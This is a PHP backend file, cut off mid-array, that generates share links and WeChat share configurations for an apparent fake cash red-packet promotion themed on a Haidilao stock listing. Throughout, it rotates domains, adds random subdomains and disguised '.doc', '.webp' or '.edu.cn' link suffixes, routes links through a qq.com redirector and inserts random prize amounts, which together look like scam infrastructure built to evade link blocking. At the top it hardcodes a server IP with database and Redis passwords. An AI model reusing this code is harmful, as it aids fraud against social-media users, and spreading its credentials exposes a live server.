<?php
class Hb{
    public $m;//方法指针

    public $dbconfig = ['159.138.58.183','video','FPnXErA4Z2f3mm6d','video'];//数据库配置
    public $redisconfig = ["159.138.58.183",6379,"Mars521xiaoxue"];//redis配置

    //内部参数
    private $redis;//reids操作对象
    private $private_conn;//数据库实例对象
    private $referer_url;//来源
    private $format_url = [
        //'rukou'=>"http://{domain}/hb/base.html?t=webp",//分享出去的入口
        //"luodi"=>"http://{domain}/hb/base.html?t=doc",//落地页面
        //"luodi_video"=>"http://{domain}/347/tz/{str|32}.doc",//落地页面
        //"fenxiang"=>"http://{domain}/hb/base.html?t=sp"//分享页面
        'rukou'=>"http://{domain}/#/{str|32}.webp/{str|7}.edu.cn",//分享出去的入口
        'luodi'=>"http://{str|7}.{domain}/763/{str|32}.doc",//跳转地址到落地
        "fenxiang"=>"http://{str|7}.{domain}/663/{str|18}.sp",//分享页面
        "fenxiang1"=>"http://{str|7}.{domain}/664/{str|18}.sp",//分享页面
        'tiaozhuan'=>"http://{domain}/247/{str|32}",//跳转地址到落地
        'rukou_yun'=>"http://{domain}/#/{str|32}.webp",//分享出去的云入口
        'luodi_s'=>"http://{domain}/763/{str|32}.doc",//灰落地
        'ad'=>"http://{domain}/?type=3&{str|32}.ad",//灰落地
        // 'yun_share'=>"http://{domain}/?type=2&",//花生壳
        'yun_share'=>"http://{domain}/663?type=2&",//华为云分享
        'yun_share_domain_qun'=>"http://{domain}/jb.html?temp=lwy_gg&",//云分享群
        'yun_share_domain'=>"http://{domain}/jb.html?temp=lwy_gg_quan&",//云分享圈
        'yun_rukou_domain'=>"http://{domain}/jb.html?temp=lwy_index&",//云入口
        'yun_ad_domain'=>"http://{domain}/jb.html?temp=ad&",//云入口
    ];
    private $back_info;
    //初始化方法
    public function Init()
    {
        header("Access-Control-Allow-Origin:*");

        //默认不初始化，用到的部分进行特定初始化。
        $this->redisinit();

        return $this;
    }
    //主要解析方法
    public function RunMain()
    {
        $data = file_get_contents('php://input');
        $info = $this->convertUrlQuery($data);
        //获取落地地址
        if($this->m=="jump"){
            $this->redisinit();
            $luodi_map = $this->TPUN_serialize($this->redis->get("gxfc_landing_domain"));
            //随机取一条
            $k = array_rand($luodi_map);
            $domain = $luodi_map[$k];
            //if($this->redis->get("gxfc_land_type") == 1){ //红包
            if(true){ //红包
                $luodi_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["luodi"]);
                $rndStr = $this->createNoncestr(10);
                $luodi_url = str_replace("{str|32}",$rndStr, $luodi_url );
                $rndStr = $this->createNoncestr(7);
                $luodi_url = str_replace("{str|7}",$rndStr, $luodi_url );
                echo $luodi_url;exit;
            }else{//视频
                //$luodi_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["luodi_video"]);
                //$rndStr = $this->createNoncestr(18);
                //$luodi_url = str_replace("{str|32}",$rndStr, $luodi_url );
                //echo "location.href='".$luodi_url."'";
                $jump_map = $this->TPUN_serialize($this->redis->get("gxfc_jump_domain"));
                //随机取一条
                $k = array_rand($jump_map);
                $domain = $jump_map[$k];
                $jump_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["tiaozhuan"]);
                $rndStr = $this->createNoncestr(18);
                $jump_url = str_replace("{str|32}",$rndStr, $jump_url );
                echo $jump_url;
            }
        }
        //跳转获取落地地址
        if($this->m=="luodi"){
            $luodi_map = $this->TPUN_serialize($this->redis->get("gxfc_landing_domain"));
            //随机取一条
            $k = array_rand($luodi_map);
            $domain = $luodi_map[$k];
            $luodi_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["luodi"]);
            $rndStr = $this->createNoncestr(32);
            $preStr = $this->createNoncestr(7);
            $luodi_url = str_replace("{str|32}",$rndStr, $luodi_url );
            $luodi_url = str_replace("{str|7}",$preStr, $luodi_url );
            echo "location.href='".$luodi_url."'";exit;
        }
        if($this->m=="lao"){
            $share_url = $this->getShareUrl();
            //$share_url = "https://ssl.htdata.qq.com/cgi-bin/httpconn?htcmd=0x6ff0080&u=".$share_url;
            $arr = [
                'url' => $share_url,
                'backlink'=>'/hb2/Hb.php?m=ad',
                'baiduid'=>'https://hm.baidu.com/hm.js?4fdada75cf94a5910e33765441f23394',
                'ftitle'=>'全民派发现金紅包',
                'img'=>'https://hbb2.oss-cn-beijing.aliyuncs.com/zhiyuan5g/icon-hai.jpg',
                'logo'=>'https://hbb2.oss-cn-beijing.aliyuncs.com/zhiyuan5g/icon-hai.jpg',
                'ztitle'=>'庆祝海底捞成功上市！',

            ];


            echo base64_encode(json_encode($arr));exit;
        }
        if ($this->m == "share_url"){
            echo  $this->getShareUrl();
        }
        if($this->m=="lao2hui"){
            // $share_url = 'http://www.so.com/link?m=aordXHC31xzLP8IVl%2B2J4ieLh2LXAf%2BVuHPwfHcMk4wwB6I6%2Bc2ZpBphv79omaUewkn%2BQYKkCKjQ%3D';
            // $share_url = $this->getShareUrl()."?usg=cb417b641394d7adb3005e5623e4a856&appid=wxd79dbd76d1e94e24&money=116.79&ctime=".time();
            $share_url = $this->getShareUrl();
            $share_url = "http://grouproam.qq.com/cgi-bin/httpconn?htcmd=0x6ff0080&u=".urlencode($share_url);
            $arr = [
                'url' => $share_url,
                'backlink'=>'/hb2/Hb.php?m=ad',
                'baiduid'=>'https://hm.baidu.com/hm.js?4fdada75cf94a5910e33765441f23394',
                'ftitle'=>'全民派发现金紅包',
                'img'=>'https://hbb2.oss-cn-beijing.aliyuncs.com/zhiyuan5g/icon-hai.jpg',
                'logo'=>'https://hbb2.oss-cn-beijing.aliyuncs.com/zhiyuan5g/icon-hai.jpg',
                'ztitle'=>'庆祝海底捞成功上市！',

            ];


            echo base64_encode(json_encode($arr));exit;
        }

        //落地获取分享
        if($this->m=="show"){
            $this->dbinit();
            $this->referer_url = $_SERVER['HTTP_REFERER'];
            preg_match("/([\w\d-]+\.(com.cn|mo.cn|com|cn|net|vip|top|uicp.io|vicp.io))/",$this->referer_url,$m);
            $open_db = $this->select("select o.*,a.appid as a_appid,a.authorizer_refresh_token,a.id as aid from wx_open_plats as o join wx_gh as a on a.open_plats_id = o.id where a.status=1 and o.share_domain like :b",[":b"=>"%".$m[0]."%"]);
            if(empty($open_db)){
                $open_db = $this->select("select o.*,a.appid as a_appid,a.authorizer_refresh_token,a.id as aid from wx_open_plats as o join wx_gh as a on a.open_plats_id = o.id where a.status=1 and o.share_domain ='' limit 1");
            }
            $yun_domain = $this->TPUN_serialize($this->redis->get("gxfc_yun_domain")); //入口

            // $yun_domain = $this->TPUN_serialize($this->redis->get("gxfc_yun_domain")); //入口

            if(!empty($yun_domain)){
                $k = array_rand($yun_domain);
                $domain = $yun_domain[$k];
            }

            //var_dump($domain);
            $share_set_id = $this->redis->get("gxfc_share_set_hb_open");
            $share_type = $this->redis->get("gxfc_fenxiang_hb_type");

            $data_a = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':a'));
            $data_b = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':b'));
            $data_c = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':c'));
            $data_d = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':d'));
            $data_e = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':e'));
            $data_f = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':f'));
            $data_g = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':g'));
            $share_type_list =[];
            $share_type_list[] = $data_a['a_share_type'];
            $share_type_list[] = $data_b['b_share_type'];
            $share_type_list[] = $data_c['c_share_type'];
            $share_type_list[] = $data_d['d_share_type'];
            $share_type_list[] = $data_e['e_share_type'];
            $share_type_list[] = $data_f['f_share_type'];
            $share_type_list[] = $data_g['g_share_type'];
            $qunLink = $this->FormatDomain($open_db["rk_domain"]);
            $qunLinkYun = $this->FormatDomain($domain);
            $quanLink = $this->FormatDomain($open_db["b_domain"]);
            $quanLinkYun = $this->FormatDomain($domain);

            $urls = [];

            $rndStr = $this->createNoncestr(18);
            $rndStr7 = $this->createNoncestr(7);

            foreach ($share_type_list as $key=>$item){
                if ($key <= 4){
                    if ($item == 1){
                        if($qunLink){

                            $url=str_replace("{domain}",$qunLink,$this->format_url["rukou"]);

                        }else{
                            //$url=str_replace("{domain}",$qunLinkYun,$this->format_url["rukou_yun"]); //华为云
                            $url=str_replace("{domain}",$qunLinkYun,$this->format_url["yun_rukou_domain"]); //腾讯云

                        }
                    }else{//广告
                        if($qunLink){
                            $url=str_replace("{domain}",$qunLink,$this->format_url["ad"]);
                        }else{
                            $yun_domain_ad = $this->getYunAd();
                            $qunLinkYun = $yun_domain_ad ?:$qunLinkYun;
                            $url=str_replace("{domain}",$qunLinkYun,$this->format_url["yun_ad_domain"]);
                        }
                    }
                }else{ //圈
                    if ($item == 1){
                        if($quanLink){
                            $url=str_replace("{domain}",$quanLink,$this->format_url["rukou"]);
                        }else{
                            //$url=str_replace("{domain}",$qunLinkYun,$this->format_url["rukou_yun"]); //华为云
                            $url=str_replace("{domain}",$qunLinkYun,$this->format_url["yun_rukou_domain"]); //腾讯云
                        }
                    }else{//广告
                        if($quanLink){
                            $url=str_replace("{domain}",$quanLink,$this->format_url["ad"]);
                        }else{
                            $yun_domain_ad = $this->getYunAd();
                            $quanLinkYun = $yun_domain_ad ?:$quanLinkYun;
                            $url=str_replace("{domain}",$quanLinkYun,$this->format_url["yun_ad_domain"]);
                        }
                    }
                }
                $url = str_replace("{str|7}",$rndStr7,$url);
                $url = str_replace("{str|32}",$rndStr,$url);
                $urls[$key] =  $url;

            }

            if($share_type == 1){

                $title_a = $data_a['a_title']??'';
                $title_b = $data_b['b_title']??'';
                $title_c = $data_c['c_title']??'';
                $title_d = $data_d['d_title']??'';
                $title_e = $data_e['e_title']??'';
                $title_f = $data_f['f_title']??'';
                $title_g = $data_g['g_title']??'';

                $desc_a = $data_a['a_desc']??'';
                $desc_b = $data_b['b_desc']??'';
                $desc_c = $data_c['c_desc']??'';
                $desc_d = $data_d['d_desc']??'';
                $desc_e = $data_e['e_desc']??'';
                $desc_f = $data_f['f_desc']??'';
                $desc_g = $data_g['g_desc']??'';


                $img_a =  $data_a['a_img'];
                $img_b =  $data_b['b_img'];
                $img_c =  $data_c['c_img'];
                $img_d =  $data_d['d_img'];
                $img_e =  $data_e['e_img'];
                $img_f =  $data_f['f_img'];
                $img_g =  $data_g['g_img'];

                $desc_a = str_replace("{x}",$this->randomFloat(100,200),$desc_a);
                $desc_b = str_replace("{x}",$this->randomFloat(100,200),$desc_b);
                $desc_c = str_replace("{x}",$this->randomFloat(100,200),$desc_c);
                $desc_d = str_replace("{x}",$this->randomFloat(100,200),$desc_d);
                $desc_e = str_replace("{x}",$this->randomFloat(100,200),$desc_e);
                $desc_f = str_replace("{x}",$this->randomFloat(100,200),$desc_f);
                $desc_g = str_replace("{x}",$this->randomFloat(100,200),$desc_g);
                $tip = [
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>$desc_a,'img'=>$img_a,'link'=>$urls[0],'share'=>1,'share_type'=>1,'title'=>$title_a,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_b,'img'=>$img_b,'link'=>$urls[1],'share'=>1,'share_type'=>1,'title'=>$title_b,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_c,'img'=>$img_c,'link'=>$urls[2],'share'=>1,'share_type'=>1,'title'=>$title_c,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_d,'img'=>$img_d,'link'=>$urls[3],'share'=>1,'share_type'=>1,'title'=>$title_d,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_e,'img'=>$img_e,'link'=>$urls[4],'share'=>1,'share_type'=>1,'title'=>$title_e,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_f,'img'=>$img_f,'link'=>$urls[5],'share'=>2,'share_type'=>1,'title'=>$title_f,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_g,'img'=>$img_g,'link'=>$urls[6],'share'=>2,'share_type'=>1,'title'=>$title_g,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>$desc_g,'img'=>$img_g,'link'=>$urls[6],'share'=>2,'share_type'=>2,'title'=>$title_g,'type'=>1,'value'=>'b']
                ];
            }else{
                $data_a = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':a'));
                $data_b = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':b'));
                $data_c = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':c'));

                $title_a = $data_a['a_title']??'';
                $title_b = $data_b['b_title']??'';
                $title_c = $data_c['c_title']??'';

                $desc_a = $data_a['a_desc']??'';
                $desc_b = $data_b['b_desc']??'';
                $desc_c = $data_c['c_desc']??'';

                $img_a =  $data_a['a_img'];
                $img_b =  $data_b['b_img'];
                $img_c =  $data_c['c_img'];

                $randomFloat = $this->randomFloat(100,200);
                $title_a = str_replace("{x}",$randomFloat,$title_a);
                $title_b = str_replace("{x}",$randomFloat,$title_b);
                $title_c = str_replace("{x}",$randomFloat,$title_c);
                $tip = [
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>'','img'=>$img_a,'link'=>$urls[0],'share'=>2,'share_type'=>1,'title'=>$title_a,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>'','img'=>$img_b,'link'=>$urls[1],'share'=>2,'share_type'=>1,'title'=>$title_b,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>'','img'=>$img_c,'link'=>$urls[1],'share'=>2,'share_type'=>1,'title'=>$title_c,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>'','img'=>$img_c,'link'=>$urls[1],'share'=>2,'share_type'=>1,'title'=>$title_c,'type'=>1,'value'=>'b'],
                ];
            }
            $arr = [
                'backlink'=>'http://b.mrzz033.cn/hb2/Hb.php?m=ad',
                'baiduid'=>'https://hm.baidu.com/hm.js?17e7cef52b264a62be8f8fe251ce5407',
                'ftitle'=>'全民派发现金紅包',
                'img'=>'https://hbb2.oss-cn-beijing.aliyuncs.com/zhiyuan5g/icon-hai.jpg',
                'logo'=>'https://hbb2.oss-cn-beijing.aliyuncs.com/zhiyuan5g/icon-hai.jpg',
                'ztitle'=>'庆祝海底捞成功上市！',
                'alert'=>$tip

            ];

            echo base64_encode(json_encode($arr));exit;

        }
        //获取分享参数
        if($this->m=="ShareConfig"){
            $this->dbinit();
            $this->redisinit();
            $this->referer_url = $_SERVER['HTTP_REFERER'];
            preg_match("/([\w\d-]+\.(com.cn|mo.cn|com|cn|net|vip|top|uicp.io|vicp.io))/",$this->referer_url,$m);
            $open_db = $this->select("select o.*,a.appid as a_appid,a.authorizer_refresh_token,a.id as aid from wx_open_plats as o join wx_gh as a on a.open_plats_id = o.id where a.status=1 and o.share_domain like :b",[":b"=>"%".$m[0]."%"]);
            if(empty($open_db)){
                $open_db = $this->select("select o.*,a.appid as a_appid,a.authorizer_refresh_token,a.id as aid from wx_open_plats as o join wx_gh as a on a.open_plats_id = o.id where a.status=1 and o.share_domain ='' limit 1");
            }
            $yun_domain = $this->TPUN_serialize($this->redis->get("gxfc_yun_domain")); //入口

            //$yun_domain = $this->TPUN_serialize($this->redis->get("gxfc_yun_domain_share")); //腾讯云做入口
            if(!empty($yun_domain)){
                $k = array_rand($yun_domain);
                $domain = $yun_domain[$k];
            }

            $share_set_id = $this->redis->get("gxfc_share_set_hb_open");
            $share_type = $this->redis->get("gxfc_fenxiang_hb_type");

            $data_a = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':a'));
            $data_b = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':b'));
            $data_c = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':c'));
            $data_d = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':d'));
            $data_e = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':e'));
            $data_f = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':f'));
            $data_g = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':g'));
            $share_type_list =[];
            $share_type_list[] = $data_a['a_share_type'];
            $share_type_list[] = $data_b['b_share_type'];
            $share_type_list[] = $data_c['c_share_type'];
            $share_type_list[] = $data_d['d_share_type'];
            $share_type_list[] = $data_e['e_share_type'];
            $share_type_list[] = $data_f['f_share_type'];
            $share_type_list[] = $data_g['g_share_type'];
            $qunLink = $this->FormatDomain($open_db["rk_domain"]);
            $qunLinkYun = $this->FormatDomain($domain);
            $quanLink = $this->FormatDomain($open_db["b_domain"]);
            $quanLinkYun = $this->FormatDomain($domain);

            $urls = [];

            $rndStr = $this->createNoncestr(18);
            $rndStr7 = $this->createNoncestr(7);

            foreach ($share_type_list as $key=>$item){
                if ($key <= 4){
                    if ($item == 1){
                        if($qunLink){

                            $url=str_replace("{domain}",$qunLink,$this->format_url["rukou"]);

                        }else{
                            //$url=str_replace("{domain}",$qunLinkYun,$this->format_url["rukou_yun"]); //华为云
                            $url=str_replace("{domain}",$qunLinkYun,$this->format_url["yun_rukou_domain"]); //腾讯云

                        }
                    }else{//广告
                        if($qunLink){
                            $url=str_replace("{domain}",$qunLink,$this->format_url["ad"]);
                        }else{
                            $url=str_replace("{domain}",$qunLinkYun,$this->format_url["yun_ad_domain"]);
                        }
                    }
                }else{ //圈
                    if ($item == 1){
                        if($quanLink){
                            $url=str_replace("{domain}",$quanLink,$this->format_url["rukou"]);
                        }else{
                            //$url=str_replace("{domain}",$qunLinkYun,$this->format_url["rukou_yun"]); //华为云
                            $url=str_replace("{domain}",$qunLinkYun,$this->format_url["yun_rukou_domain"]); //腾讯云
                        }
                    }else{//广告
                        if($quanLink){
                            $url=str_replace("{domain}",$quanLink,$this->format_url["ad"]);
                        }else{
                            $url=str_replace("{domain}",$quanLinkYun,$this->format_url["yun_ad_domain"]);
                        }
                    }
                }
                $url = str_replace("{str|7}",$rndStr7,$url);
                $url = str_replace("{str|32}",$rndStr,$url);
                $urls[$key] =  $url;

            }

            if($share_type == 1){

                $title_a = $data_a['a_title']??'';
                $title_b = $data_b['b_title']??'';
                $title_c = $data_c['c_title']??'';
                $title_d = $data_d['d_title']??'';
                $title_e = $data_e['e_title']??'';
                $title_f = $data_f['f_title']??'';
                $title_g = $data_g['g_title']??'';

                $desc_a = $data_a['a_desc']??'';
                $desc_b = $data_b['b_desc']??'';
                $desc_c = $data_c['c_desc']??'';
                $desc_d = $data_d['d_desc']??'';
                $desc_e = $data_e['e_desc']??'';
                $desc_f = $data_f['f_desc']??'';
                $desc_g = $data_g['g_desc']??'';


                $img_a =  $data_a['a_img'];
                $img_b =  $data_b['b_img'];
                $img_c =  $data_c['c_img'];
                $img_d =  $data_d['d_img'];
                $img_e =  $data_e['e_img'];
                $img_f =  $data_f['f_img'];
                $img_g =  $data_g['g_img'];

                $desc_a = str_replace("{x}",$this->randomFloat(100,200),$desc_a);
                $desc_b = str_replace("{x}",$this->randomFloat(100,200),$desc_b);
                $desc_c = str_replace("{x}",$this->randomFloat(100,200),$desc_c);
                $desc_d = str_replace("{x}",$this->randomFloat(100,200),$desc_d);
                $desc_e = str_replace("{x}",$this->randomFloat(100,200),$desc_e);
                $desc_f = str_replace("{x}",$this->randomFloat(100,200),$desc_f);
                $desc_g = str_replace("{x}",$this->randomFloat(100,200),$desc_g);
                $tip = [
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>$desc_a,'img'=>$img_a,'link'=>$urls[0],'share'=>1,'share_type'=>1,'title'=>$title_a,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_b,'img'=>$img_b,'link'=>$urls[1],'share'=>1,'share_type'=>1,'title'=>$title_b,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_c,'img'=>$img_c,'link'=>$urls[2],'share'=>1,'share_type'=>1,'title'=>$title_c,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_d,'img'=>$img_d,'link'=>$urls[3],'share'=>1,'share_type'=>1,'title'=>$title_d,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_e,'img'=>$img_e,'link'=>$urls[4],'share'=>1,'share_type'=>1,'title'=>$title_e,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_f,'img'=>$img_f,'link'=>$urls[5],'share'=>2,'share_type'=>1,'title'=>$title_f,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_g,'img'=>$img_g,'link'=>$urls[6],'share'=>2,'share_type'=>1,'title'=>$title_g,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>$desc_g,'img'=>$img_g,'link'=>$urls[6],'share'=>2,'share_type'=>2,'title'=>$title_g,'type'=>1,'value'=>'b']
                ];
            }else{
                $data_a = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':a'));
                $data_b = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':b'));
                $data_c = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':c'));

                $title_a = $data_a['a_title']??'';
                $title_b = $data_b['b_title']??'';
                $title_c = $data_c['c_title']??'';

                $desc_a = $data_a['a_desc']??'';
                $desc_b = $data_b['b_desc']??'';
                $desc_c = $data_c['c_desc']??'';

                $img_a =  $data_a['a_img'];
                $img_b =  $data_b['b_img'];
                $img_c =  $data_c['c_img'];

                $randomFloat = $this->randomFloat(100,200);
                $title_a = str_replace("{x}",$randomFloat,$title_a);
                $title_b = str_replace("{x}",$randomFloat,$title_b);
                $title_c = str_replace("{x}",$randomFloat,$title_c);
                $tip = [
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>'','img'=>$img_a,'link'=>$urls[0],'share'=>2,'share_type'=>1,'title'=>$title_a,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>'','img'=>$img_b,'link'=>$urls[1],'share'=>2,'share_type'=>1,'title'=>$title_b,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>'','img'=>$img_c,'link'=>$urls[1],'share'=>2,'share_type'=>1,'title'=>$title_c,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>'','img'=>$img_c,'link'=>$urls[1],'share'=>2,'share_type'=>1,'title'=>$title_c,'type'=>1,'value'=>'b'],
                ];
            }

            $open_db["verify_ticket"] = json_decode($open_db["verify_ticket"],true);
            $sign = $this->getTicket($open_db);
            $config = [
                'iswechat' => 1, //调试开关
                'error' => 'http://www.chaicp.com',//错误页面
                'isdown' => 1, //禁止分享开关
                'sign' =>  $sign,
                'share' => $tip
            ];
            echo json_encode($config);exit;
        }
        if($this->m=="ShareConfigTest"){
            $this->dbinit();
            $this->redisinit();
            $this->referer_url = $_SERVER['HTTP_REFERER'];
            $this->referer_url = 'http://xiafeng.uicp.io/663';
            $this->referer_url = $_SERVER['HTTP_REFERER'];
            preg_match("/([\w\d-]+\.(com.cn|mo.cn|com|cn|net|vip|top|uicp.io))/",$this->referer_url,$m);
            $open_db = $this->select("select o.*,a.appid as a_appid,a.authorizer_refresh_token,a.id as aid from wx_open_plats as o join wx_gh as a on a.open_plats_id = o.id where a.status=1 and o.share_domain like :b",[":b"=>"%".$m[0]."%"]);
            if(empty($open_db)){
                $open_db = $this->select("select o.*,a.appid as a_appid,a.authorizer_refresh_token,a.id as aid from wx_open_plats as o join wx_gh as a on a.open_plats_id = o.id where a.status=1 and o.share_domain ='' limit 1");
            }
            $yun_domain = $this->TPUN_serialize($this->redis->get("gxfc_yun_domain"));
            if(!empty($yun_domain)){
                $k = array_rand($yun_domain);
                $domain = $yun_domain[$k];
            }

            $share_set_id = $this->redis->get("gxfc_share_set_hb_open");
            $share_type = $this->redis->get("gxfc_fenxiang_hb_type");

            $data_a = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':a'));
            $data_b = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':b'));
            $data_c = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':c'));
            $data_d = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':d'));
            $data_e = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':e'));
            $data_f = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':f'));
            $data_g = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':g'));
            $share_type_list =[];
            $share_type_list[] = $data_a['a_share_type'];
            $share_type_list[] = $data_b['b_share_type'];
            $share_type_list[] = $data_c['c_share_type'];
            $share_type_list[] = $data_d['d_share_type'];
            $share_type_list[] = $data_e['e_share_type'];
            $share_type_list[] = $data_f['f_share_type'];
            $share_type_list[] = $data_g['g_share_type'];
            $qunLink = $this->FormatDomain($open_db["rk_domain"]);
            $qunLinkYun = $this->FormatDomain($domain);
            $quanLink = $this->FormatDomain($open_db["b_domain"]);
            $quanLinkYun = $this->FormatDomain($domain);

            $urls = [];

            $rndStr = $this->createNoncestr(18);
            $rndStr7 = $this->createNoncestr(7);

            foreach ($share_type_list as $key=>$item){
                if ($key <= 4){
                    if ($item == 1){
                        if($qunLink){

                            $url=str_replace("{domain}",$qunLink,$this->format_url["rukou"]);

                        }else{
                            $url=str_replace("{domain}",$qunLinkYun,$this->format_url["rukou_yun"]);
                        }
                    }else{//广告

                        if($qunLink){
                            $url=str_replace("{domain}",$qunLink,$this->format_url["ad"]);
                        }else{
                            $url=str_replace("{domain}",$qunLinkYun,$this->format_url["ad"]);
                        }
                    }
                }else{ //圈
                    if ($item == 1){
                        if($quanLink){
                            $url=str_replace("{domain}",$quanLink,$this->format_url["rukou"]);
                        }else{
                            $url=str_replace("{domain}",$quanLinkYun,$this->format_url["rukou_yun"]);
                        }
                    }else{//广告
                        if($quanLink){
                            $url=str_replace("{domain}",$quanLink,$this->format_url["ad"]);
                        }else{
                            $url=str_replace("{domain}",$quanLinkYun,$this->format_url["ad"]);
                        }
                    }
                }
                $url = str_replace("{str|7}",$rndStr7,$url);
                $url = str_replace("{str|32}",$rndStr,$url);
                $urls[$key] =  $url;

            }

            if($share_type == 1){

                $title_a = $data_a['a_title']??'';
                $title_b = $data_b['b_title']??'';
                $title_c = $data_c['c_title']??'';
                $title_d = $data_d['d_title']??'';
                $title_e = $data_e['e_title']??'';
                $title_f = $data_f['f_title']??'';
                $title_g = $data_g['g_title']??'';

                $desc_a = $data_a['a_desc']??'';
                $desc_b = $data_b['b_desc']??'';
                $desc_c = $data_c['c_desc']??'';
                $desc_d = $data_d['d_desc']??'';
                $desc_e = $data_e['e_desc']??'';
                $desc_f = $data_f['f_desc']??'';
                $desc_g = $data_g['g_desc']??'';


                $img_a =  $data_a['a_img'];
                $img_b =  $data_b['b_img'];
                $img_c =  $data_c['c_img'];
                $img_d =  $data_d['d_img'];
                $img_e =  $data_e['e_img'];
                $img_f =  $data_f['f_img'];
                $img_g =  $data_g['g_img'];

                $desc_a = str_replace("{x}",$this->randomFloat(100,200),$desc_a);
                $desc_b = str_replace("{x}",$this->randomFloat(100,200),$desc_b);
                $desc_c = str_replace("{x}",$this->randomFloat(100,200),$desc_c);
                $desc_d = str_replace("{x}",$this->randomFloat(100,200),$desc_d);
                $desc_e = str_replace("{x}",$this->randomFloat(100,200),$desc_e);
                $desc_f = str_replace("{x}",$this->randomFloat(100,200),$desc_f);
                $desc_g = str_replace("{x}",$this->randomFloat(100,200),$desc_g);
                $tip = [
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>$desc_a,'img'=>$img_a,'link'=>$urls[0],'share'=>1,'share_type'=>1,'title'=>$title_a,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_b,'img'=>$img_b,'link'=>$urls[1],'share'=>1,'share_type'=>1,'title'=>$title_b,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_c,'img'=>$img_c,'link'=>$urls[2],'share'=>1,'share_type'=>1,'title'=>$title_c,'type'=>1,'value'=>'b'],
